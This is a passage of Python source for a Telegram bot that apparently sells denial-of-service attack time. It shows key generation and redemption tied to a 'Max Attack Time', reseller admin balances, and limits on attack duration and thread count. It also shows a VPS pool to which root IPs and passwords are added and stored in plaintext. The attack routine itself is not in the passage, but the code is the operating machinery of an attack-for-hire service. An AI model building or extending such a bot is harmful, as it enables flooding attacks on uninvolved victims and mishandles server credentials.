        'redeemed': False
    }
    
    save_keys(keys)
    
    bot.send_message(
        chat_id,
        f"*🔑 Key Generated Successfully!*\n\n"
        f"Key: `{key}`\n"
        f"Type: `{message.text[2:]}`\n"
        f"Max Time: `{max_time}s`\n"
        f"Generated by: @{username if username != 'Admin' else 'Admin'}",
        reply_markup=get_main_markup(message.from_user.id),
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text == "🔑 Redeem Key")
def redeem_key_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    bot.send_message(
        chat_id,
        "*Please enter your key to redeem:*",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, redeem_key)

def redeem_key(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    key = message.text.strip()
    
    keys = load_keys()
    
    if key not in keys:
        bot.send_message(chat_id, "*Invalid key!*", parse_mode='Markdown')
        return
    
    if keys[key]['redeemed']:
        bot.send_message(chat_id, "*Key already redeemed!*", parse_mode='Markdown')
        return
    
    duration = keys[key]['duration']
    max_time = keys[key].get('max_time', 60)  # Get max_time from key
    
    # Calculate expiration time
    if duration == 'hour':
        expires = datetime.now() + timedelta(hours=1)
    elif duration == 'day':
        expires = datetime.now() + timedelta(days=1)
    elif duration == 'week':
        expires = datetime.now() + timedelta(weeks=1)
    else:
        expires = datetime.now()
    
    users = load_users()
    user_exists = any(u['user_id'] == user_id for u in users)
    
    user_data = {
        'user_id': user_id,
        'key': key,
        'valid_until': expires.isoformat(),
        'max_time': max_time  # Store max_time with user
    }
    
    if user_exists:
        # Update existing user
        for user in users:
            if user['user_id'] == user_id:
                user.update(user_data)
                break
    else:
        users.append(user_data)
    
    keys[key]['redeemed'] = True
    keys[key]['redeemed_by'] = user_id
    keys[key]['redeemed_at'] = datetime.now().isoformat()
    
    if save_users(users) and save_keys(keys):
        bot.send_message(
            chat_id,
            f"*Key redeemed successfully!*\n\n"
            f"Expires: {expires.strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"Max Attack Time: {max_time}s",
            reply_markup=get_main_markup(user_id),
            parse_mode='Markdown'
        )
    else:
        bot.send_message(chat_id, "*Error saving data. Please try again.*", parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text == "🆙 Uptime")
def show_uptime(message):
    """Show bot uptime to users."""
    current_time = time.time()
    uptime_seconds = int(current_time - BOT_START_TIME)
    
    # Convert seconds to days, hours, minutes, seconds
    days = uptime_seconds // (24 * 3600)
    uptime_seconds %= (24 * 3600)
    hours = uptime_seconds // 3600
    uptime_seconds %= 3600
    minutes = uptime_seconds // 60
    seconds = uptime_seconds % 60
    
    uptime_str = ""
    if days > 0:
        uptime_str += f"{days}d "
    if hours > 0:
        uptime_str += f"{hours}h "
    if minutes > 0:
        uptime_str += f"{minutes}m "
    uptime_str += f"{seconds}s"
    
    bot.send_message(
        message.chat.id,
        f"*🤖 Bot Uptime*\n\n"
        f"⏱️ {uptime_str}\n\n"
        f"🌟 Powered by Apna Bhai Network",
        parse_mode='Markdown',
        reply_markup=get_main_markup(message.from_user.id)
    )

@bot.message_handler(func=lambda message: message.text == "👥 Group Management" and is_admin(message.from_user.id))
def group_management(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        bot.send_message(chat_id, "*You don't have permission for group management.*", parse_mode='Markdown')
        return
    
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    buttons = [
        KeyboardButton("➕ Add Group"),
        KeyboardButton("🗑️ Remove Group"),
        KeyboardButton("📋 List Groups"),
        KeyboardButton("➕ Add Channel"),
        KeyboardButton("🗑️ Remove Channel"),
        KeyboardButton("⬅️ Main Menu")
    ]
    markup.add(*buttons)
    
    bot.send_message(
        chat_id,
        "*Group Management*",
        reply_markup=markup,
        parse_mode='Markdown'
    )

# Keyboard Markups
@bot.message_handler(func=lambda message: message.text == "🎁 Claim")
def claim_time(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    # Check if user is approved
    users = load_users()
    user = next((u for u in users if u['user_id'] == user_id), None)
    
    if not user:
        bot.send_message(chat_id, "*You need to be an approved user to claim time!*", parse_mode='Markdown')
        return
    
    claim_settings = load_claim_settings()
    
    # Check if claiming is enabled
    if not claim_settings.get('enabled', True):
        bot.send_message(chat_id, "*The claim system is currently disabled by admins.*", parse_mode='Markdown')
        return
    
    # Check cooldown
    last_claim = claim_settings['last_claims'].get(str(user_id), 0)
    current_time = time.time()
    cooldown = claim_settings.get('cooldown', DEFAULT_CLAIM_COOLDOWN)
    
    if current_time - last_claim < cooldown:
        remaining = cooldown - (current_time - last_claim)
        hours = int(remaining // 3600)
        minutes = int((remaining % 3600) // 60)
        bot.send_message(
            chat_id,
            f"*You can claim again in {hours}h {minutes}m!*",
            parse_mode='Markdown'
        )
        return
    
    # Add time to user's account
    claim_amount = claim_settings.get('amount', DEFAULT_CLAIM_AMOUNT)
    current_expiry = datetime.fromisoformat(user['valid_until'])
    new_expiry = current_expiry + timedelta(seconds=claim_amount)
    user['valid_until'] = new_expiry.isoformat()
    
    # Update last claim time
    claim_settings['last_claims'][str(user_id)] = current_time
    save_claim_settings(claim_settings)
    
    if save_users(users):
        bot.send_message(
            chat_id,
            f"*🎉 You claimed {claim_amount//3600} hours!*\n\n"
            f"New expiry: {new_expiry.strftime('%Y-%m-%d %H:%M:%S')}",
            parse_mode='Markdown'
        )
    else:
        bot.send_message(chat_id, "*Error saving your claim. Please try again.*", parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text == "➕ Add Group" and is_admin(message.from_user.id))
def add_group_command(message):
    chat_id = message.chat.id
    bot.send_message(
        chat_id,
        "*Send the Group ID to approve:*",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_group_addition)

def process_group_addition(message):
    chat_id = message.chat.id
    group_id = message.text.strip()
    
    try:
        group_id = int(group_id)
    except ValueError:
        bot.send_message(chat_id, "*Invalid Group ID. Please enter a number.*", parse_mode='Markdown')
        return
    
    approved_groups = load_approved_groups()
    if str(group_id) in approved_groups['groups']:
        bot.send_message(chat_id, "*Group is already approved!*", parse_mode='Markdown')
        return
    
    approved_groups['groups'].append(str(group_id))
    save_approved_groups(approved_groups)
    
    bot.send_message(
        chat_id,
        f"*Group {group_id} approved successfully!*",
        reply_markup=get_admin_markup(),
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text == "🗑️ Remove Group" and is_admin(message.from_user.id))
def remove_group_command(message):
    chat_id = message.chat.id
    approved_groups = load_approved_groups()
    
    if not approved_groups['groups']:
        bot.send_message(chat_id, "*No approved groups found!*", parse_mode='Markdown')
        return
    
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    for group_id in approved_groups['groups']:
        markup.add(KeyboardButton(f"Remove {group_id}"))
    markup.add(KeyboardButton("⬅️ Main Menu"))
    
    bot.send_message(
        chat_id,
        "*Select group to remove:*",
        reply_markup=markup,
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text.startswith("Remove ") and is_admin(message.from_user.id))
def process_group_removal(message):
    chat_id = message.chat.id
    group_id = message.text.split()[1]
    
    approved_groups = load_approved_groups()
    if group_id in approved_groups['groups']:
        approved_groups['groups'].remove(group_id)
        save_approved_groups(approved_groups)
        bot.send_message(
            chat_id,
            f"*Group {group_id} removed successfully!*",
            reply_markup=get_admin_markup(),
            parse_mode='Markdown'
        )
    else:
        bot.send_message(
            chat_id,
            "*Group not found in approved list!*",
            reply_markup=get_admin_markup(),
            parse_mode='Markdown'
        )

@bot.message_handler(func=lambda message: message.text == "📋 List Groups" and is_admin(message.from_user.id))
def list_groups_command(message):
    chat_id = message.chat.id
    approved_groups = load_approved_groups()
    
    if not approved_groups['groups']:
        bot.send_message(chat_id, "*No approved groups found!*", parse_mode='Markdown')
        return
    
    response = "*Approved Groups:*\n\n" + "\n".join(f"`{group_id}`" for group_id in approved_groups['groups'])
    bot.send_message(chat_id, response, parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text == "➕ Add Channel" and is_admin(message.from_user.id))
def add_channel_command(message):
    chat_id = message.chat.id
    bot.send_message(
        chat_id,
        "*Send the channel username or link to add as required:*",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_channel_addition)

def process_channel_addition(message):
    chat_id = message.chat.id
    channel = message.text.strip()
    
    required_channels = load_required_channels()
    if len(required_channels['channels']) >= 3:
        bot.send_message(chat_id, "*Maximum 3 channels allowed!*", parse_mode='Markdown')
        return
    
    if channel in required_channels['channels']:
        bot.send_message(chat_id, "*Channel is already in required list!*", parse_mode='Markdown')
        return
    
    required_channels['channels'].append(channel)
    save_required_channels(required_channels)
    
    bot.send_message(
        chat_id,
        f"*Channel {channel} added successfully!*",
        reply_markup=get_admin_markup(),
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text == "🗑️ Remove Channel" and is_admin(message.from_user.id))
def remove_channel_command(message):
    chat_id = message.chat.id
    required_channels = load_required_channels()
    
    if not required_channels['channels']:
        bot.send_message(chat_id, "*No required channels found!*", parse_mode='Markdown')
        return
    
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    for channel in required_channels['channels']:
        markup.add(KeyboardButton(f"Remove {channel}"))
    markup.add(KeyboardButton("⬅️ Main Menu"))
    
    bot.send_message(
        chat_id,
        "*Select channel to remove:*",
        reply_markup=markup,
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text.startswith("Remove ") and is_admin(message.from_user.id))
def process_channel_removal(message):
    chat_id = message.chat.id
    channel = message.text.split()[1]
    
    required_channels = load_required_channels()
    if channel in required_channels['channels']:
        required_channels['channels'].remove(channel)
        save_required_channels(required_channels)
        bot.send_message(
            chat_id,
            f"*Channel {channel} removed successfully!*",
            reply_markup=get_admin_markup(),
            parse_mode='Markdown'
        )
    else:
        bot.send_message(
            chat_id,
            "*Channel not found in required list!*",
            reply_markup=get_admin_markup(),
            parse_mode='Markdown'
        )

@bot.message_handler(func=lambda message: message.text == "📝 Feedback")
def handle_feedback_button(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not FEEDBACK_CHANNEL:
        bot.send_message(chat_id, "*Feedback system not configured yet.*", parse_mode='Markdown', reply_markup=get_main_markup(user_id))
        return
    
    msg = bot.send_message(
        chat_id,
        "💬 *Please write your feedback:*\n\n"
        "(Type your message and send it now)",
        parse_mode='Markdown',
        reply_markup=ReplyKeyboardRemove()
    )
    bot.register_next_step_handler(msg, process_feedback_submission)

def process_feedback_submission(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    feedback_text = message.text.strip()
    username = message.from_user.username or "NoUsername"

    try:
        bot.send_message(
            FEEDBACK_CHANNEL,
            f"📢 *New Feedback*\n\n"
            f"From: @{username} ({user_id})\n"
            f"Feedback: {feedback_text}",
            parse_mode='Markdown'
        )
        bot.send_message(
            chat_id,
            "*✅ Feedback sent successfully!*",
            parse_mode='Markdown',
            reply_markup=get_main_markup(user_id)
        )
    except Exception as e:
        logger.error(f"Error sending feedback: {e}")
        bot.send_message(
            chat_id,
            "*❌ Failed to send feedback. Please try again later.*",
            parse_mode='Markdown',
            reply_markup=get_main_markup(user_id)
        )

@bot.message_handler(func=lambda message: message.text == "👥 User Management" and is_admin(message.from_user.id))
def user_management(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        bot.send_message(chat_id, "*You don't have permission for user management.*", parse_mode='Markdown')
        return
    
    bot.send_message(
        chat_id,
        "*User Management*",
        reply_markup=get_admin_markup(),
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text == "🗑️ Remove User" and is_admin(message.from_user.id))
def remove_user_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        bot.send_message(chat_id, "*You don't have permission to remove users.*", parse_mode='Markdown')
        return
    
    bot.send_message(
        chat_id,
        "*Send the User ID to remove:*",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_user_removal)

def process_user_removal(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    target_user = message.text.strip()
    
    try:
        target_user_id = int(target_user)
    except ValueError:
        bot.send_message(chat_id, "*Invalid User ID. Please enter a number.*", parse_mode='Markdown')
        return
    
    users = load_users()
    updated_users = [u for u in users if u['user_id'] != target_user_id]
    
    if len(updated_users) < len(users):
        save_users(updated_users)
        bot.send_message(
            chat_id,
            f"*User {target_user_id} removed successfully!*",
            reply_markup=get_admin_markup(),
            parse_mode='Markdown'
        )
    else:
        bot.send_message(
            chat_id,
            f"*User {target_user_id} not found!*",
            reply_markup=get_admin_markup(),
            parse_mode='Markdown'
        )

@bot.message_handler(func=lambda message: message.text == "📊 Check Balance" and is_admin(message.from_user.id))
def check_balance(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if is_super_admin(user_id):
        bot.send_message(chat_id, "*You have unlimited balance!*", parse_mode='Markdown')
        return
    
    admin_data = load_admin_data()
    balance = admin_data['admins'].get(str(user_id), {}).get('balance', 0)
    
    bot.send_message(
        chat_id,
        f"*Your current balance: {balance} Rs*",
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text == "👤 Approve Users" and is_admin(message.from_user.id))
def approve_users_command(message):
    chat_id = message.chat.id
    pending = load_pending_users()
    
    if not pending['users']:
        bot.send_message(chat_id, "No pending user requests!")
        return
    
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    for user in pending['users']:
        markup.add(KeyboardButton(f"Approve {user}"))
    markup.add(KeyboardButton("⬅️ Main Menu"))
    
    bot.send_message(chat_id, "Pending user requests:", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text.startswith("Approve ") and is_admin(message.from_user.id))
def approve_user(message):
    chat_id = message.chat.id
    user_id = message.text.split()[1]
    
    pending = load_pending_users()
    if user_id in pending['users']:
        pending['users'].remove(user_id)
        save_pending_users(pending)
        
        # Add user to approved list
        users = load_users()
        users.append({
            'user_id': int(user_id),
            'valid_until': (datetime.now() + timedelta(days=30)).isoformat(),
            'approved_by': message.from_user.id
        })
        save_users(users)
        
        bot.send_message(chat_id, f"User {user_id} approved!")
    else:
        bot.send_message(chat_id, "User not found in pending list!")

@bot.message_handler(func=lambda message: message.text == "🛠️ Admin Tools" and is_super_admin(message.from_user.id))
def admin_tools(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_super_admin(user_id):
        bot.send_message(chat_id, "*You don't have permission for admin tools.*", parse_mode='Markdown')
        return
    
    bot.send_message(
        chat_id,
        "*Admin Tools*",
        reply_markup=get_super_admin_markup(),
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text == "➕ Add Admin" and is_super_admin(message.from_user.id))
def add_admin_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_super_admin(user_id):
        bot.send_message(chat_id, "*You don't have permission to add admins.*", parse_mode='Markdown')
        return
    
    bot.send_message(
        chat_id,
        "*Send the User ID to add as admin:*",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_admin_addition)

def process_admin_addition(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    new_admin = message.text.strip()
    
    try:
        new_admin_id = int(new_admin)
    except ValueError:
        bot.send_message(chat_id, "*Invalid User ID. Please enter a number.*", parse_mode='Markdown')
        return
    
    admin_data = load_admin_data()
    
    if str(new_admin_id) in admin_data['admins']:
        bot.send_message(
            chat_id,
            f"*User {new_admin_id} is already an admin!*",
            reply_markup=get_super_admin_markup(),
            parse_mode='Markdown'
        )
        return
    
    admin_data['admins'][str(new_admin_id)] = {
        'added_by': user_id,
        'added_at': datetime.now().isoformat(),
        'balance': 0
    }
    
    if save_admin_data(admin_data):
        bot.send_message(
            chat_id,
            f"*User {new_admin_id} added as admin successfully!*",
            reply_markup=get_super_admin_markup(),
            parse_mode='Markdown'
        )
    else:
        bot.send_message(
            chat_id,
            f"*Failed to add admin {new_admin_id}.*",
            reply_markup=get_super_admin_markup(),
            parse_mode='Markdown'
        )

@bot.message_handler(func=lambda message: message.text == "➖ Remove Admin" and is_super_admin(message.from_user.id))
def remove_admin_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_super_admin(user_id):
        bot.send_message(chat_id, "*You don't have permission to remove admins.*", parse_mode='Markdown')
        return
    
    bot.send_message(
        chat_id,
        "*Send the Admin ID to remove:*",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_admin_removal)

def process_admin_removal(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    admin_to_remove = message.text.strip()
    
    try:
        admin_id = int(admin_to_remove)
    except ValueError:
        bot.send_message(chat_id, "*Invalid Admin ID. Please enter a number.*", parse_mode='Markdown')
        return
    
    if admin_id in ADMIN_IDS:
        bot.send_message(
            chat_id,
            "*Cannot remove super admin!*",
            reply_markup=get_super_admin_markup(),
            parse_mode='Markdown'
        )
        return
    
    admin_data = load_admin_data()
    
    if str(admin_id) not in admin_data['admins']:
        bot.send_message(
            chat_id,
            f"*User {admin_id} is not an admin!*",
            reply_markup=get_super_admin_markup(),
            parse_mode='Markdown'
        )
        return
    
    del admin_data['admins'][str(admin_id)]
    
    if save_admin_data(admin_data):
        bot.send_message(
            chat_id,
            f"*Admin {admin_id} removed successfully!*",
            reply_markup=get_super_admin_markup(),
            parse_mode='Markdown'
        )
    else:
        bot.send_message(
            chat_id,
            f"*Failed to remove admin {admin_id}.*",
            reply_markup=get_super_admin_markup(),
            parse_mode='Markdown'
        )

@bot.message_handler(func=lambda message: message.text == "📋 List Users" and is_super_admin(message.from_user.id))
def list_users_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_super_admin(user_id):
        bot.send_message(chat_id, "*You don't have permission to list users.*", parse_mode='Markdown')
        return
    
    users = load_users()
    admin_data = load_admin_data()
    
    if not users:
        bot.send_message(chat_id, "*No users found!*", parse_mode='Markdown')
        return
    
    response = "*Registered Users:*\n\n"
    for user in users:
        valid_until = datetime.fromisoformat(user['valid_until'])
        remaining = valid_until - datetime.now()
        hours = int(remaining.total_seconds() // 3600)
        minutes = int((remaining.total_seconds() % 3600) // 60)
        
        response += (
            f"User ID: `{user['user_id']}`\n"
            f"Key: `{user['key']}`\n"
            f"Expires in: `{hours}h {minutes}m`\n"
            f"Valid until: `{valid_until.strftime('%Y-%m-%d %H:%M:%S')}`\n\n"
        )
    
    bot.send_message(
        chat_id,
        response,
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text == "⏱ Set Max Time" and is_super_admin(message.from_user.id))
def set_max_time_menu(message):
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(KeyboardButton("⏱ Set Group Max Time"))
    markup.add(KeyboardButton("⏱ Set User Max Time"))
    markup.add(KeyboardButton("⬅️ Main Menu"))
    bot.send_message(message.chat.id, "Select max time to set:", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "⏱ Set Group Max Time" and is_super_admin(message.from_user.id))
def set_group_max_time(message):
    bot.send_message(message.chat.id, "Enter new maximum attack time for groups (seconds):")
    bot.register_next_step_handler(message, process_group_max_time)

def process_group_max_time(message):
    global GROUP_MAX_ATTACK_TIME
    try:
        new_time = int(message.text)
        if 30 <= new_time <= 300:  # 30s to 5min limit for groups
            GROUP_MAX_ATTACK_TIME = new_time
            bot.send_message(message.chat.id, f"Group max attack time set to {GROUP_MAX_ATTACK_TIME} seconds!")
        else:
            bot.send_message(message.chat.id, "Invalid time! Must be between 30-300 seconds.")
    except ValueError:
        bot.send_message(message.chat.id, "Invalid input! Please enter a number.")

@bot.message_handler(func=lambda message: message.text == "⏱ Set User Max Time" and is_super_admin(message.from_user.id))
def set_user_max_time(message):
    bot.send_message(message.chat.id, "Enter new maximum attack time for direct users (seconds):")
    bot.register_next_step_handler(message, process_user_max_time)

def process_user_max_time(message):
    global USER_MAX_ATTACK_TIME
    try:
        new_time = int(message.text)
        if 60 <= new_time <= 600:  # 1min to 10min limit for direct users
            USER_MAX_ATTACK_TIME = new_time
            bot.send_message(message.chat.id, f"User max attack time set to {USER_MAX_ATTACK_TIME} seconds!")
        else:
            bot.send_message(message.chat.id, "Invalid time! Must be between 60-600 seconds.")
    except ValueError:
        bot.send_message(message.chat.id, "Invalid input! Please enter a number.")

@bot.message_handler(func=lambda message: message.text == "🎁 Claim")
def claim_time(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    # Check if user is approved
    users = load_users()
    user = next((u for u in users if u['user_id'] == user_id), None)
    
    if not user:
        bot.send_message(chat_id, "*You need to be an approved user to claim time!*", parse_mode='Markdown')
        return
    
    claim_settings = load_claim_settings()
    
    # Check if claiming is enabled
    if not claim_settings.get('enabled', True):
        bot.send_message(chat_id, "*The claim system is currently disabled by admins.*", parse_mode='Markdown')
        return
    
    # Check cooldown
    last_claim = claim_settings['last_claims'].get(str(user_id), 0)
    current_time = time.time()
    cooldown = claim_settings.get('cooldown', DEFAULT_CLAIM_COOLDOWN)
    
    if current_time - last_claim < cooldown:
        remaining = cooldown - (current_time - last_claim)
        hours = int(remaining // 3600)
        minutes = int((remaining % 3600) // 60)
        bot.send_message(
            chat_id,
            f"*You can claim again in {hours}h {minutes}m!*",
            parse_mode='Markdown'
        )
        return
    
    # Add time to user's account
    claim_amount = claim_settings.get('amount', DEFAULT_CLAIM_AMOUNT)
    current_expiry = datetime.fromisoformat(user['valid_until'])
    new_expiry = current_expiry + timedelta(seconds=claim_amount)
    user['valid_until'] = new_expiry.isoformat()
    
    # Update last claim time
    claim_settings['last_claims'][str(user_id)] = current_time
    save_claim_settings(claim_settings)
    
    if save_users(users):
        bot.send_message(
            chat_id,
            f"*🎉 You claimed {claim_amount//3600} hours!*\n\n"
            f"New expiry: {new_expiry.strftime('%Y-%m-%d %H:%M:%S')}",
            parse_mode='Markdown'
        )
    else:
        bot.send_message(chat_id, "*Error saving your claim. Please try again.*", parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text == "⏱ Claim Settings" and is_admin(message.from_user.id))
def claim_settings_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        bot.send_message(chat_id, "*You don't have permission to modify claim settings.*", parse_mode='Markdown')
        return
    
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    row1 = [KeyboardButton("🔛 Toggle Claim"), KeyboardButton("⏳ Set Claim Amount")]
    row2 = [KeyboardButton("⏱ Set Claim Cooldown"), KeyboardButton("⬅️ Main Menu")]
    markup.row(*row1)
    markup.row(*row2)
    
    claim_settings = load_claim_settings()
    status = "ENABLED ✅" if claim_settings['enabled'] else "DISABLED ❌"
    
    bot.send_message(
        chat_id,
        f"*Claim System Settings*\n\n"
        f"Status: {status}\n"
        f"Amount: {claim_settings['amount']//3600} hours\n"
        f"Cooldown: {claim_settings['cooldown']//3600} hours\n\n"
        f"Select an option to modify:",
        reply_markup=markup,
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text == "🔛 Toggle Claim" and is_admin(message.from_user.id))
def toggle_claim_command(message):
    claim_settings = load_claim_settings()
    claim_settings['enabled'] = not claim_settings['enabled']
    save_claim_settings(claim_settings)
    
    status = "ENABLED ✅" if claim_settings['enabled'] else "DISABLED ❌"
    bot.send_message(
        message.chat.id,
        f"*Claim system is now {status}*",
        reply_markup=get_admin_markup(),
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text == "⏳ Set Claim Amount" and is_admin(message.from_user.id))
def set_claim_amount_command(message):
    bot.send_message(
        message.chat.id,
        "*Enter new claim amount in hours (1-24):*",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_claim_amount)

def process_claim_amount(message):
    try:
        hours = int(message.text.strip())
        if hours < 1 or hours > 24:
            raise ValueError
        
        claim_settings = load_claim_settings()
        claim_settings['amount'] = hours * 3600  # Convert to seconds
        save_claim_settings(claim_settings)
        
        bot.send_message(
            message.chat.id,
            f"*Claim amount set to {hours} hours!*",
            reply_markup=get_admin_markup(),
            parse_mode='Markdown'
        )
    except:
        bot.send_message(
            message.chat.id,
            "*Invalid amount! Please enter a number between 1-24.*",
            reply_markup=get_admin_markup(),
            parse_mode='Markdown'
        )

@bot.message_handler(func=lambda message: message.text == "⏱ Set Claim Cooldown" and is_admin(message.from_user.id))
def set_claim_cooldown_command(message):
    bot.send_message(
        message.chat.id,
        "*Enter new claim cooldown in hours (1-72):*",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_claim_cooldown)

def process_claim_cooldown(message):
    try:
        hours = int(message.text.strip())
        if hours < 1 or hours > 72:
            raise ValueError
        
        claim_settings = load_claim_settings()
        claim_settings['cooldown'] = hours * 3600  # Convert to seconds
        save_claim_settings(claim_settings)
        
        bot.send_message(
            message.chat.id,
            f"*Claim cooldown set to {hours} hours!*",
            reply_markup=get_admin_markup(),
            parse_mode='Markdown'
        )
    except:
        bot.send_message(
            message.chat.id,
            "*Invalid cooldown! Please enter a number between 1-72.*",
            reply_markup=get_admin_markup(),
            parse_mode='Markdown'
        )

@bot.message_handler(func=lambda message: message.text == "⚙️ Set Threads" and is_super_admin(message.from_user.id))
def set_threads_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_super_admin(user_id):
        bot.send_message(chat_id, "*You don't have permission to set threads.*", parse_mode='Markdown')
        return
    
    bot.send_message(
        chat_id,
        "*Enter new thread count (100-1000):*",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_thread_setting)

def process_thread_setting(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    new_threads = message.text.strip()
    
    try:
        threads = int(new_threads)
        if threads < 100 or threads > 1000:
            raise ValueError
    except ValueError:
        bot.send_message(
            chat_id,
            "*Invalid thread count. Please enter a number between 100 and 1000.*",
            reply_markup=get_super_admin_markup(),
            parse_mode='Markdown'
        )
        return
    
    global thread_count
    thread_count = threads
    
    bot.send_message(
        chat_id,
        f"*Thread count updated to {thread_count} successfully!*",
        reply_markup=get_super_admin_markup(),
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text == "🖥️ VPS Management" and is_owner(message.from_user.id))
def vps_management(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.send_message(chat_id, "*You don't have permission for VPS management.*", parse_mode='Markdown')
        return
    
    bot.send_message(
        chat_id,
        "*VPS Management*",
        reply_markup=get_vps_markup(),
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text == "➕ Add VPS" and is_owner(message.from_user.id))
def add_vps_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.send_message(chat_id, "*You don't have permission to add VPS.*", parse_mode='Markdown')
        return
    
    bot.send_message(
        chat_id,
        "*Send VPS details in format:*\n\n"
        "`IP USERNAME PASSWORD`\n\n"
        "Example:\n"
        "`1.1.1.1 root password123`",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_vps_addition)

def process_vps_addition(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    vps_details = message.text.strip().split()
    
    if len(vps_details) != 3:
        bot.send_message(
            chat_id,
            "*Invalid format. Please use: IP USERNAME PASSWORD*",
            reply_markup=get_vps_markup(),
            parse_mode='Markdown'
        )
        return
    
    ip, username, password = vps_details
    vps_data = load_vps_data()
    
    if ip in vps_data['vps']:
        bot.send_message(
            chat_id,
            f"*VPS {ip} already exists!*",
            reply_markup=get_vps_markup(),
            parse_mode='Markdown'
        )
        return
    
    vps_data['vps'][ip] = {
        'username': username,
        'password': password,
        'added_by': user_id,
        'added_at': datetime.now().isoformat()
    }
    
    if save_vps_data(vps_data):
        bot.send_message(
            chat_id,
            f"*VPS {ip} added successfully!*",
            reply_markup=get_vps_markup(),
            parse_mode='Markdown'
        )
    else:
        bot.send_message(
            chat_id,
            f"*Failed to add VPS {ip}.*",
            reply_markup=get_vps_markup(),
            parse_mode='Markdown'
        )

@bot.message_handler(func=lambda message: message.text == "🗑️ Remove VPS" and is_owner(message.from_user.id))
def remove_vps_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.send_message(chat_id, "🔒 *You don't have permission to remove VPS!*", parse_mode='Markdown')
        return
    
    vps_data = load_vps_data()
    
    if not vps_data['vps']:
        bot.send_message(chat_id, "❌ *No VPS found to remove!*", parse_mode='Markdown')
        return
    
    vps_list = list(vps_data['vps'].items())
    response = "✨ *VPS Removal Panel* ✨\n"
    response += "╔════════════════════════════╗\n"
    response += "║  🗑️ *SELECT VPS TO REMOVE*  ║\n"
    response += "╚════════════════════════════╝\n\n"
    response += "🔢 *Available VPS Servers:*\n"
    
    for i, (ip, details) in enumerate(vps_list, 1):
        response += f"\n🔘 *{i}.*  🌐 `{ip}`\n"
        response += f"   👤 User: `{details['username']}`\n"
        response += f"   ⏳ Added: `{datetime.fromisoformat(details['added_at']).strftime('%d %b %Y')}`\n"
    
    response += "\n\n💡 *Enter the number* (1-{}) *or* ❌ *type '0' to cancel*".format(len(vps_list))
    
    msg = bot.send_message(
        chat_id,
        response,
        parse_mode='Markdown'
    )
    
    bot.register_next_step_handler(msg, process_vps_removal_by_number, vps_list)

def process_vps_removal_by_number(message, vps_list):
    chat_id = message.chat.id
    user_id = message.from_user.id
    selection = message.text.strip()
    
    try:
        selection_num = int(selection)
        
